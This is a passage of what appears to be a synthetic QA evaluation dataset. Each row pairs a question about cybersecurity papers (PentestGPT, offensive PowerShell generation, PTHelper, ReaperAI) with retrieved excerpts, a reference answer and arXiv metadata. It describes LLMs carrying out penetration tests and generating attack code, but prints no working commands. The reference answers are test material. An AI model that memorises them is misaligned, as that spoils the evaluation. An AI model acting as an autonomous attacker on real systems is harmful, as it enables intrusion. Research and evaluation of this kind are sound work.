Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
"How do chosen LLMs fare on pen testing benchmarks with OWASP top 10 and CWE, esp. in complex tasks and coherence, using iterative prompts and feedback?","[' to assess the performances of various LLMs in\npenetration testing tasks using the strategy mentioned above.\nModel Selection. Our study focuses on three cutting-edge\nLLMs that are currently accessible: GPT-3.5 with 8k to-\nken limit, GPT-4 with 32k token limit from OpenAI, and\nLaMDA [33] from Google. These models are selected based\non their prominence in the research community and consis-\ntent availability. To interact with the LLMs mentioned above,\nwe utilize chatbot services provided by OpenAI and Google,\nnamely ChatGPT [34] and Bard [18]. For this paper, the terms\nGPT-3.5, GPT-4, and Bard will represent these three LLMs.\nExperimental Setup. Our experiments occur in a local setting\nwith both target and testing machines on the same private\nnetwork. The testing machine runs on Kali Linux [35], version\n2023.1.\n3We selected Offensive Security Certified Professionals (OSCP) testers.\nTool Usage. Our study aims to assess the innate capabilities\nof LLMs on penetration testing, without reliance on end-to-\nend automated vulnerability scanners such as Nexus [36]\nand OpenVAS [37]. Consequently, we explicitly instruct the\nLLMs to refrain from using these tools. We follow the LLMs’\nrecommendations for utilizing other tools designed to validate\nspecific vulnerability types (e.g., sqlmap [38] for SQL injec-\ntions). Occasionally, versioning discrepancies may lead the\nLLMs to provide incorrect instructions for tool usage. In such\ninstances, our penetration testing experts evaluate whether the\ninstructions would have been valid for a previous version of\nthe tool. They then make any necessary adjustments to ensure\nthe tool’s correct operation.\n4.3\nCapability Evaluation (RQ1)\nTo address RQ1, we evaluate the performance of three lead-\ning LLMs: GPT-4, Bard, and GPT-3.5. We summarize these\nfindings in Table 1. Each LLM successfully completes at least\none end-to-end penetration test, highlighting their versatility\nin simpler environments. Of these, GPT-4 excels, achieving\nsuccess on 4 easy and 1 medium difficulty targets. Bard and\nGPT-3.5 follow with success on 2 and 1 easy targets, respec-\ntively. In sub-tasks, GPT-4 completes 55 out of 77 on easy\ntargets and 30 out of 71 on medium. Bard and GPT-3.5 also\nshow potential, finishing 16 (22.54%) and 13 (18.31%) of\nmedium difficulty sub-tasks, respectively. However, on hard\ntargets, all models’ performance declines. Though they can\ninitiate the reconnaissance phase, they struggle to exploit iden-\ntified vulnerabilities. This is anticipated since hard targets\nare designed to be especially challenging. They often fea-\nture seemingly vulnerable services that are non-exploitable,\nknown as rabbit holes [39]. The pathways to exploit these\nmachines are unique and unpredictable, resisting automated\ntool replication. For example, the target Falafel has special-\nized SQL injection vulnerabilities resistant to sqlmap. Current\nLLMs cannot tackle these without human expert input.\nFinding 1: Large Language Models (LLMs) have shown\nproficiency in conducting end-to-end penetration testing\ntasks but struggle to overcome challenges presented by\nmore difficult targets.\nWe further examine the detailed sub-task completion per-\nformances of the three LLMs compared to the walkthrough\n(WT), as presented in Table 2. Analyzing the completion sta-\ntus, we identify several areas where LLMs excel. First, they\nadeptly utilize common penetration testing tools to interpret\nthe corresponding outputs, especially in enumeration tasks\ncorrectly. For example, all three evaluated LLMs successfully\nperform nine Port Scanning sub-tasks. They can configure\nthe widely-used port scanning tool, nmap [40], comprehend\nthe scan results, and formulate subsequent actions. Second,\nthe LLMs reveal a deep understanding of prevalent vulner-\n6\nTable 1: Overall performance of LLMs on Penetration Testing Benchmark.\nEasy\nMedium\nHard\nAverage\nTools\nOverall (7)\nSub-task (77)\nOverall (4)\nSub-task (71)\nOverall (2)\nSub-task (34)\nOverall (13)\nSub-task (182)\nGPT-3.5\n1 (14.29%)\n24 (31.17%)\n0 (0.00%)\n13 (18.31%)\n0 (0', 'Box [12] and\nVulnHub [13]—two leading platforms for penetration test-\ning challenges. Comprising 13 targets with 182 sub-tasks,\nour benchmark encompasses all vulnerabilities appearing in\n1\narXiv:2308.06782v2  [cs.SE]  2 Jun 2024\nOWASP’s top 10 vulnerability list [14] and 18 Common\nWeakness Enumeration (CWE) items [15]. The benchmark\noffers a more detailed evaluation of the tester’s performance\nby monitoring the completion status for each sub-task.\nWith this benchmark, we perform an exploratory study\nusing GPT-3.5 [16], GPT-4 [17], and Bard [18] as representa-\ntive LLMs. Our test strategy is interactive and iterative. We\ncraft tailored prompts to guide the LLMs through penetration\ntesting. Each LLM, presented with prompts and target ma-\nchine information, generates step-by-step penetration testing\noperations. We then execute the suggested operations in a\ncontrolled environment, document the results, and feed them\nback to the LLM to inform and refine its next steps. This\ncycle (prompting, executing, and feedback) is repeated un-\ntil the LLM completes the entire penetration testing process\nautonomously. To evaluate LLMs, we compare their results\nagainst baseline solutions from official walkthroughs and\ncertified penetration testers. By analyzing similarities and\ndifferences in their problem-solving approaches, we aim to\nbetter understand LLMs’ capabilities in penetration testing\nand how their strategies differ from human experts.\nOur investigation yields intriguing insights into the capa-\nbilities and limitations of LLMs in penetration testing. We\ndiscover that LLMs demonstrate proficiency in managing spe-\ncific sub-tasks within the testing process, such as utilizing\ntesting tools, interpreting their outputs, and suggesting subse-\nquent actions. Compared to human experts, LLMs are espe-\ncially adept at executing complex commands and options with\ntesting tools, while models like GPT-4 excel in comprehend-\ning source code and pinpointing vulnerabilities. Furthermore,\nLLMs can craft appropriate test commands and accurately de-\nscribe graphical user-interface operations needed for specific\ntasks. Leveraging their vast knowledge base, they can design\ninventive testing procedures to unveil potential vulnerabili-\nties in real-world systems and CTF challenges. However, we\nalso note that LLMs have difficulty in maintaining a coherent\ngrasp of the overarching testing scenario, a vital aspect for\nattaining the testing goal. As the dialogue advances, they may\nlose sight of earlier discoveries and struggle to apply their\nreasoning consistently toward the final objective. Addition-\nally, LLMs overemphasize recent tasks in the conversation\nhistory, regardless of their vulnerability status. As a result,\nthey tend to neglect other potential attack surfaces exposed in\nprior tests and fail to complete the penetration testing task.\nBuilding on our insights into LLMs’ capabilities in pen-\netration testing, we present PENTESTGPT1, an interactive\nsystem designed to enhance the application of LLMs in this\ndomain. Drawing inspiration from the collaborative dynamics\ncommonly observed in real-world human penetration testing\nteams, PENTESTGPT is particularly tailored to manage large\nand intricate projects. It features a tripartite architecture com-\nprising Reasoning, Generation, and Parsing Modules, each\n1PENTESTGPT is King Arthur’s legendary sword, known for its excep-\ntional cutting power and the ability to pierce armor.\nreflecting specific roles within penetration testing teams. The\nReasoning Module emulates the function of a lead tester,\nfocusing on maintaining a high-level overview of the penetra-\ntion testing status. We introduce a novel representation, the\nPentesting Task Tree (PTT), based on the cybersecurity attack\ntree [19]. This structure encodes the testing process’s ongoing\nstatus and steers subsequent actions. Uniquely, this representa-\ntion can be translated into natural language and interpreted by\nthe LLM, thereby comprehended by the Generation Module\nand directing the testing procedure. The Generation Module,\nmirroring a junior tester’s role, is responsible for construct-\ning detailed procedures for specific sub-tasks. Translating\nthese into exact testing operations augments the generation\nprocess’s accuracy. Meanwhile, the Parsing Module deals\nwith diverse text data encountered during penetration testing,\nsuch as tool outputs, source codes, and HTTP web pages. It\ncondenses and emphasizes these texts, extracting essential\ninformation. Collectively, these modules function as an inte']","The chosen LLMs demonstrate proficiency in managing specific sub-tasks within the testing process, such as utilizing testing tools, interpreting their outputs, and suggesting subsequent actions. However, they struggle with maintaining a coherent grasp of the overarching testing scenario, which is vital for attaining the testing goal. As the dialogue advances, they may lose sight of earlier discoveries and struggle to apply their reasoning consistently toward the final objective. Additionally, LLMs overemphasize recent tasks in the conversation history, regardless of their vulnerability status, leading them to neglect other potential attack surfaces exposed in prior tests and fail to complete the penetration testing task.",multi_context,"[{'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}, {'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}]",True
Which pre-trained models on Python and Java are used for code gen?,"[' framework, ensuring\nthat the PowerShell commands align with recognized\ncybersecurity methodologies.\n• Stockpile [43]: is a plugin for the CALDERA cyberse-\ncurity framework [1,44] developed by MITRE and in-\ntroduces a layer of sophistication by incorporating struc-\ntured data integral for adversary emulation. Therefore,\nthe dataset does not encompass raw PowerShell com-\nmands only but also captures the contextual information\nand relationships between commands within the broader\ncontext of adversarial scenarios.\n• Empire [45]: a post-exploitation and adversary emula-\ntion framework integrated with MITRE ATT&CK, pro-\nvides PowerShell commands representative of advanced\nmalicious techniques, further enriching the dataset with\nnuanced and intricate scenarios.\n• Online sources: we manually verified and selected ad-\nditional offensive samples from several security-related\nonline sources. We gathered samples from HackTricks\n[46], Red Team Recipe [47], and Infosec Matter [48],\ncommunity-driven cybersecurity wikis about ethical\nhacking, penetration testing, and information security.\nBy including diverse examples specific to the offen-\nsive PowerShell dataset, the model acquires a more pro-\nfound understanding of the conventions and best prac-\ntices unique to PowerShell security commands.\nWe manually curated the dataset to cover the highest num-\nber of tactics in the MITRE ATT&CK framework. In particu-\nlar, the dataset covers 12 out of 14 tactics from the MITRE\nATT&CK framework, the de facto standard for adversar-\nial techniques representation, with varying numbers of tech-\nniques and sub-techniques per tactic. Figure 2 illustrates the\nnumber of entries for each ATT&CK tactic. Each entry in the\ndataset is annotated with an NL description extracted from\nthe respective source. We manually annotated every sample\nthat did not come with a predefined description. Moreover,\nwe enriched all those descriptions that did not provide enough\ninformation about the specific PowerShell command. For\ninstance, in the case of Atomic Red Team, the PowerShell\ncommands represent implementations of the techniques in\nthe ATT&CK framework. Consequently, these commands are\n3The ATT&CK framework is a comprehensive knowledge base of the\ntactics, techniques, and procedures (TTPs) that adversaries leverage during\ncyberattacks, developed by MITRE.\n5\n32\n38\n163\n430\n205\n54\n10\n12\n4\n96\n42\n37\n5\n0\n100\n200\n300\n400\n500\nCollection\nCommand and Control\nCredential Access\nDefense Evasion\nDiscovery\nExecution\nExfiltration\nImpact\nInitial Access\nLateral Movement\nPersistence\nPrivilege Escalation\nReconnaissance\nNumber of dataset entries\nMITRE ATT&CK Tactics\nFigure 2: Mapping of fine-tuning dataset samples on the\nMITRE ATT&CK tactics.\noften labeled with the technique name, which provides infor-\nmative content about the technique itself rather than what the\ncommand does. To better understand how programmers and\nsecurity experts describe PowerShell scripts and how to deal\nwith ambiguities in natural language, we referred to popular\nbooks and manuals [49–51].\nFinally, we notice that the size of our dataset is in line with\nother state-of-the-art corpora used to fine-tune ML models.\nIn fact, in state-of-the-art code generation, the datasets for\nfine-tuning are relatively limited, in the order of one thousand\nsamples [52].\n3.3\nCode Generation Task\nTo ensure the robustness of our study, we adopt the following\nstate-of-the-art NMT models:\n• CodeT5+ [15] is a new family of Transformer models\npre-trained with a diverse set of pretraining tasks to learn\nrich representations from both unimodal code data and\nbimodal code-text data. We utilize the variant with model\nsize 220M, trained from scratch following T5’s architec-\nture [53]. It has an encoder-decoder architecture with 12\ndecoder layers, each with 12 attention heads and hidden\nlayer dimension of 768, and 512 for the size of position\nembeddings. We set the learning rate α = 0.00005, batch\nsize = 16, and beam size = 10.\n• CodeGPT [16], a Transformer-based language model\npre-trained on millions of Python functions and Java\nmethods. The model architecture consists of 12 layers of\nTransformer decoders. We followed previous work for\nthe implementation [54].']",The pre-trained models on Python and Java used for code generation are CodeT5+ and CodeGPT.,reasoning,"[{'Published': '2024-04-19', 'Title': 'The Power of Words: Generating PowerShell Attacks from Natural Language', 'Authors': 'Pietro Liguori, Christian Marescalco, Roberto Natella, Vittorio Orbinato, Luciano Pianese', 'Summary': 'As the Windows OS stands out as one of the most targeted systems, the\nPowerShell language has become a key tool for malicious actors and\ncybersecurity professionals (e.g., for penetration testing). This work explores\nan uncharted domain in AI code generation by automatically generating offensive\nPowerShell code from natural language descriptions using Neural Machine\nTranslation (NMT). For training and evaluation purposes, we propose two novel\ndatasets with PowerShell code samples, one with manually curated descriptions\nin natural language and another code-only dataset for reinforcing the training.\nWe present an extensive evaluation of state-of-the-art NMT models and analyze\nthe generated code both statically and dynamically. Results indicate that\ntuning NMT using our dataset is effective at generating offensive PowerShell\ncode. Comparative analysis against the most widely used LLM service ChatGPT\nreveals the specialized strengths of our fine-tuned models.', 'entry_id': 'http://arxiv.org/abs/2404.12893v1', 'published_first_time': '2024-04-19', 'comment': '18th USENIX WOOT Conference on Offensive Technologies, GitHub Repo:\n  https://github.com/dessertlab/powershell-offensive-code-generation', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2404.12893v1', 'http://arxiv.org/pdf/2404.12893v1']}]",True
How does PTHelper's modular design and black-box support differ from past pentesting methods?,"[' provides more time to focus on other phases and helps in keeping track of the information\ngenerated throughout the process.\nThe automation of penetration testing has been a topic since the last decade. Several studies and approaches have been\ndeveloped over the course of the years, differing each other in scope and purpose. The application that first introduced\nthis automation process was made by Boddy et al [13]. In 2005, Mark Boddy demonstrated that it was possible to\nuse classical planning to generate hypothetical attack scenarios to exploit a specific system, with the downside of\nconsidering only insider attacks.\nThe approach in [8] took into account the presence of outsiders or hackers and used classical planning to automate the\npenetration testing process into a framework like Metasploit. One of the goals of this approach was to demonstrate\nthat scalability is not a problem for PDDL solving, as the approach worked great with medium to large networks.\nNevertheless, this approach bases its job into having a full overview of the target organization and is focused on the\nperspective of the defender (not the real-case scenario for a pentester).\nThe approach of [14] focuses on time efficient generation of a minimal attack graph, using a model-checker that\nremoves visualization problems and avoids state-space explosion. A similar project is [15], that tries to automatize\nthe Vulnerability Assessment phase. Both of these projects do not generate the PDDL language automatically and\nneither of them work with a framework like Metasploit. They present theoretical concepts with complex mathematical\ncalculations.\n3\narXiv Template\nA PREPRINT\nThe FIDIUS framework [7] is also one of the first attempts that uses artificial intelligence to automate the penetration\ntesting process. This framework implements DDL for the attack plan generation and also uses a Neural Network to\npredict the value of a host in terms of the importance for the attacker. The problem is that, as said in [7], ""When using\nthe classical planner the user has to specify all hosts, its connections, its subnets and its services in advance"", which,\nfor sure, does not represent a real pentesting scenario.\nUnlike traditional planning, [16] attempts to solve attack graphs with Markov Decision Processes (MDPs), which model\nthe world as states and actions as transitions between states, with a function that assigns a value to each state change.\nTheir work seeks to define an optimal pentesting policy – that is, what best action is – for each state prior to execution\nbased on using a fixed-lookahead horizon. By contrast, the approach in [17] features an adaptive attacker – i.e., using\nonline techniques alongside an MDP-solving system. Both of these MDP-based approaches assign probabilities to\nactions, moving uncertainty from the environment into uncertainty in the action’s success. Again, this approach is\ntheoretical and is based on a white-box scenario, which is not the reality when performing pentesting assessments.\nThese works, despite having some differences in their approach, share several points in common that make them\nunknown for the pentesting community. The points are the following:\n1. The scenario in which these approaches work is a white-box scenario, where it is assumed that all the variables\nof the environment are known by the pentester at first. In real scenarios, the pentesters usually need to discover\nthe information by themselves along the assessment, like a real attacker would do.\n2. These studies focus on one specific phase of the pentest, isolating that part from the rest of the asessment. The\nfinal result is an automated phase of the pentest, but not a whole automated pentesting process.\n3. These studies develop a mathematical solution, but they do not provide a real and usable tool.\nCompared to those, Lore [9] tried to automate and emulate a red team by using a trained model. However, it has only\nlimited application to the scenarios used for testing as the authors stated: ""The systems and software used to train the\nmodels are not representative to systems and software in the real world"". Additionally, it does not provide support for\nthe reporting phase.\nIn contrast to these approaches, this work presents PTHelper, a modular tool designed for pentesters to work in a\nblack-box scenario providing help and tooling for each of the phases of the process. In the next section, the design and\narchitecture of the tool is explained.\n3\nArchitecture Overview\n3.1\nA different approach to automation\nPTHelper is crafted to provide supportive functionality to the pentester throughout the whole penetration testing\nassessment. It incorporates four modules, each of them specialized in a different phase of the pentesting process. The\nnovelty of PTHelper lies in the orchestrated interaction of these modules, automating the', ' phases of the pentesting assessment, including reporting.\nThe paper is organised as follows. Section 2 offers an explanation of the context of penetration testing (pentesting)\nand performs an analysis to the state of the art techniques to the problem of automating the process. After that, the\napproach of PTHelper is presented. In Section 3, the tool’s architecture and implementation is detailed and in Section\n4, experiments are performed in order to check that the objective has been accomplished and to look for points of\nimprovement. Finally, in Section 5, a conclusion and the future work in the development of PTHelper are detailed.\n2\nBackground\n2.1\nOffensive Security and Penetration Testing\nNowadays, taking defensive security measures is not enough to ensure the security of modern systems and networks.\nA supplementary proactive strategy, i.e. offensive security, is required where systems are constantly analyzed by\nprofessionals that try to imitate a malicious threat actor and detect vulnerabilities before a real threat does. Both\noffensive and defensive security complement each other to achieve security in an organization. Offensive Security is a\nbroad term that encompasses various techniques and practices, like vulnerability assessments, exploit development,\nsocial engineering, and penetration testing, among others.\nIn penetration testing, vulnerabilities are found and also exploited to compromise other hosts and detect additional\nvulnerabilities in the infrastructure of an organization. Penetration testers act as real adversaries of the organization, so\nthey need to be updated with the latest tools and methodologies in order to mimic the latest attacks.\nThey have a wealth of resources at their disposal. A primary resource is the National Vulnerability Database (NVD) [5]\nthat performs an in-depth analysis of software vulnerabilities published in the Common Vulnerabilities and Exposures\n(CVE) database. The CVE system, an industry standard, assigns a unique identifier to publicly disclosed cybersecurity\nvulnerabilities, thereby enabling a systematic approach to vulnerability management. The NVD further enriches the\nCVE data by assigning severity scores to known vulnerabilities using the Common Vulnerability Scoring System\n(CVSS).\nBeyond just identifying and scoring vulnerabilities, pentesters often need to leverage public exploits to validate these\nvulnerabilities. Resources like Exploit Database [10] and Metasploit Framework are commonly used for this purpose.\nThese CVE identifiers, CVSS scores, and public exploits play an instrumental role for pentesters. The ability to refer to\nstandardized databases and exploit resources simplifies the complex task of vulnerability management, enabling a more\nprecise and targeted approach to maintaining system security.\n2.2\nPenetration testing lifecycle\nPenetration testing is a structured process made up of various stages that typically need to be carried out within a limited\ntime (Figure 1). As mentioned in [11], a common methodology to divide the stages is the following:\n1. Scoping: The pentester works with the client to identify the assets and systems that will be tested and the\nrules of engagement. The purpose of the scope is to ensure that the pentester does not disrupt the expected\noperations of the client’s business.\n2. Reconnaissance: The pentester gathers information about the target environment using specialized tools such\nas Nmap [3], Nessus [12] or by applying special techniques, e.g. Open-Source Intelligence (OSINT).\n2\narXiv Template\nA PREPRINT\nFigure 1: Graphical view of the penetration testing lifecycle.\n3. Vulnerability Analysis: Vulnerabilities of the network devices found in the last step are identifiedMost\nof the vulnerabilities are already disclosed publicly and are mapped to vulnerability repositories, like the\naforementioned NVD [5] vulnerability database.\n4. Exploitation: In this phase, detected vulnerabilities are exploited . Pentesters can obtain the exploits from\nseveral sources including public exploit databases, such as ExploitDB [10]. For zero-day vulnerabilities,\nprivate exploit databases or manually crafted exploits can be used.\n5. Reporting: This phase consists in the development of an executive report, a high-level overview explaining\nthe findings in detail (the vulnerabilities discovered and their severity), as well as the risks involved and the\nremediation to avoid them. Technical and non-technical sections are included to detail this information to\ndifferent stakeholders of the organization.\nThe pentesting lifecycle follows an iterative approach (Figure 1) as findings and insights from each test may serve as\ninput for subsequent tests, and, sometimes, exploiting a host can lead to space to perform reconnaissance on new hosts\nthat were not previously reachable.\n2.3\nPentest automation\nAutomating pentesting can significantly reduce the time and effort to test systems and applications for vulnerabilities. It\ncan also avoid the risk of vulnerabilities or attack vectors being overlooked which may happen in a manual scenario.\nAutomating the report phase']","PTHelper's modular design and black-box support differ from past pentesting methods by providing supportive functionality throughout the entire penetration testing assessment, including reporting. Unlike previous methods that often focus on a single phase or require a white-box scenario where all variables are known in advance, PTHelper is designed to work in a black-box scenario, helping pentesters discover information as they go, similar to a real attacker.",multi_context,"[{'Published': '2024-06-12', 'Title': 'PTHelper: An open source tool to support the Penetration Testing process', 'Authors': 'Jacobo Casado de Gracia, Alfonso Sánchez-Macián', 'Summary': 'Offensive security is one of the state of the art measures to protect\nenterprises and organizations. Penetration testing, broadly called pentesting,\nis a branch of offensive security designed to find, rate and exploit these\nvulnerabilities, in order to assess the security posture of an organization.\nThis process is often time-consuming and the quantity of information that\npentesters need to manage might also be difficult to handle. This project takes\na practical approach to solve the automation of pentesting and proposes a\nusable tool, called PTHelper. This open-source tool has been designed in a\nmodular way to be easily upgradable by the pentesting community, and uses state\nof the art tools and artificial intelligence to achieve its objective.', 'entry_id': 'http://arxiv.org/abs/2406.08242v1', 'published_first_time': '2024-06-12', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2406.08242v1', 'http://arxiv.org/pdf/2406.08242v1']}, {'Published': '2024-06-12', 'Title': 'PTHelper: An open source tool to support the Penetration Testing process', 'Authors': 'Jacobo Casado de Gracia, Alfonso Sánchez-Macián', 'Summary': 'Offensive security is one of the state of the art measures to protect\nenterprises and organizations. Penetration testing, broadly called pentesting,\nis a branch of offensive security designed to find, rate and exploit these\nvulnerabilities, in order to assess the security posture of an organization.\nThis process is often time-consuming and the quantity of information that\npentesters need to manage might also be difficult to handle. This project takes\na practical approach to solve the automation of pentesting and proposes a\nusable tool, called PTHelper. This open-source tool has been designed in a\nmodular way to be easily upgradable by the pentesting community, and uses state\nof the art tools and artificial intelligence to achieve its objective.', 'entry_id': 'http://arxiv.org/abs/2406.08242v1', 'published_first_time': '2024-06-12', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2406.08242v1', 'http://arxiv.org/pdf/2406.08242v1']}]",True
"How does ReaperAI use GPT-4 in Python to find and exploit vulnerabilities, and what ethical issues come up?","['ARTIFICIAL INTELLIGENCE AS THE NEW HACKER:\nDEVELOPING AGENTS FOR OFFENSIVE SECURITY\nby\nLeroy Jacob Valencia\nSubmitted in Partial Fulfillment\nof the Requirements for the Degree of\nMasters of Science in Transdiciplinary Cybersecurity\nNew Mexico Institute of Mining and Technology\nSocorro, New Mexico\nMay, 2024\narXiv:2406.07561v1  [cs.CR]  9 May 2024\nThis work is dedicated to my wife, whose unwavering support and belief in my\npotential have been my constant source of strength and inspiration.\nLeroy Jacob Valencia\nNew Mexico Institute of Mining and Technology\nMay, 2024\nACKNOWLEDGMENTS\nI wish to extend my sincerest gratitude to Danny Quist PhD., whose insights\nand guidance were invaluable throughout this research. We also appreciate the\nsupport provided by New Mexico Cybersecurity Center of Excellence. Lastly, I\nwant to thank my peers and family members for their encouragement.\nThis report was typeset with L\nAT\nEX1 by the author.\n1The L\nAT\nEX document preparation system was developed by Leslie Lamport as a special ver-\nsion of Donald Knuth’s T\nEX program for computer typesetting. T\nEX is a trademark of the Ameri-\ncan Mathematical Society. The L\nA\nT\nEX macro package for the New Mexico Institute of Mining and\nTechnology report format was written by John W. Shipman.\niii\nABSTRACT\nIn the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper ex-\nplores the integration of Artificial Intelligence (AI) into offensive cybersecurity,\nparticularly through the development of an autonomous AI agent, ReaperAI, de-\nsigned to simulate and execute cyberattacks. Leveraging the capabilities of Large\nLanguage Models (LLMs) such as GPT-4, ReaperAI demonstrates the potential to\nidentify, exploit, and analyze security vulnerabilities autonomously.\nThis research outlines the core methodologies that can be utilized to increase\nconsistency and performance, including task-driven penetration testing frame-\nworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced\nby Retrieval Augmented Generation (RAG) for contextual understanding and\nmemory retention. ReaperAI was tested on platforms including, Hack The Box,\nwhere it successfully exploited known vulnerabilities, demonstrating its poten-\ntial power.\nHowever, the deployment of AI in offensive security presents significant eth-\nical and operational challenges. The agent’s development process revealed com-\nplexities in command execution, error handling, and maintaining ethical con-\nstraints, highlighting areas for future enhancement.\nThis study contributes to the discussion on AI’s role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with cy-\nbersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a unique\napproach to AI implementation in cybersecurity, emphasizing innovation.\nKeywords: Artificial Intelligence, Offensive Cybersecurity, Large Language Mod-\nels, Penetration Testing\nCONTENTS\nPage\nLIST OF TABLES\nviii\nLIST OF FIGURES\nix\nCHAPTER 1.\nINTRODUCTION\n1\n1.1\nProblem Statement . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n1\n1.2\nImpact\n. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n2\nCHAPTER 2.\nBACKGROUND AND LITERATURE REVIEW\n3\n2.1\nEvolution of Offensive Security . . . . . . . . . . . . . . . . . . . . .\n3\n2.2\nEvolution of Large Language Models . . . . . . . . . . . . . . . . . .\n3\n2.3\nAI in Cybersecurity: A Historical Perspective . . . . . . . . . . . . .\n4\n2.4\nReview of Current AI in Offensive Security . . . . . . . . . . . . . .\n4\n2.4.1\nPentestGPT . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n5\n2.4.2\nHackingbuddyGPT . . . . . . . . . .']","ReaperAI leverages the capabilities of Large Language Models (LLMs) such as GPT-4 to identify, exploit, and analyze security vulnerabilities autonomously. It operates within a structured environment using Python, enhanced by Retrieval Augmented Generation (RAG) for contextual understanding and memory retention. The deployment of AI in offensive security presents significant ethical and operational challenges, including complexities in command execution, error handling, and maintaining ethical constraints.",multi_context,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, 